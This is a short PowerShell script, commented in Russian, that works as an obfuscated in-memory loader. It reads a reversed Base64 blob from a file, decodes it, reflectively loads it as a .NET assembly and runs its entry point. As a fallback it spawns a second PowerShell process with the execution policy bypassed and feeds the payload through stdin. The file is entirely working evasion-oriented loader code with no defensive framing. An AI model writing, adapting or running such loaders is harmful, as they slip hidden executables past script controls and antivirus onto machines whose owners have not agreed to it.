﻿# Путь к файлу с reversed Base64
$path = "base64.txt"

# Читаем reversed Base64
$revBase64 = Get-Content -Path $path -Raw

function Invoke-Assembly {
    param([string]$Reversed)

    # Разворачиваем строку
    $chars = $Reversed.ToCharArray()
    [Array]::Reverse($chars)
    $fixedBase64 = -join $chars

    # Декодируем в байты
    $bytes = [Convert]::FromBase64String($fixedBase64)

    try {
        $asm = [System.Reflection.Assembly]::Load($bytes)
        $entry = $asm.EntryPoint
        if (-not $entry) { return $false }

        $instance = if ($entry.IsStatic) { $null } else { New-Object $entry.DeclaringType }

        $paramCount = $entry.GetParameters().Count
        switch ($paramCount) {
            0 { $argsToPass = @() }
            1 { $argsToPass = @( ,([string[]]@()) ) }
            default { return $false }
        }

        $entry.Invoke($instance, $argsToPass) | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

if (-not (Invoke-Assembly -Reversed $revBase64)) {
    # fallback: передаём reversed base64 во второй процесс через stdin
    $psCmd = @'
$revBase64 = [Console]::In.ReadToEnd()
$chars = $revBase64.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars
$bytes = [Convert]::FromBase64String($fixedBase64)
$asm = [System.Reflection.Assembly]::Load($bytes)
$entry = $asm.EntryPoint
if ($entry) {
    $instance = if ($entry.IsStatic) { $null } else { New-Object $entry.DeclaringType }
    if ($entry.GetParameters().Count -eq 0) {
        $entry.Invoke($instance, @())
    } else {
        $entry.Invoke($instance, @( ,([string[]]@()) ))
    }
}
'@

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command -"
    $psi.UseShellExecute = $false
    $psi.RedirectStandardInput = $true
    $proc = [System.Diagnostics.Process]::Start($psi)

    # Важно: пишем без WriteLine, иначе base64 уходит как "команда"
    $proc.StandardInput.Write($revBase64)
    $proc.StandardInput.Close()
}
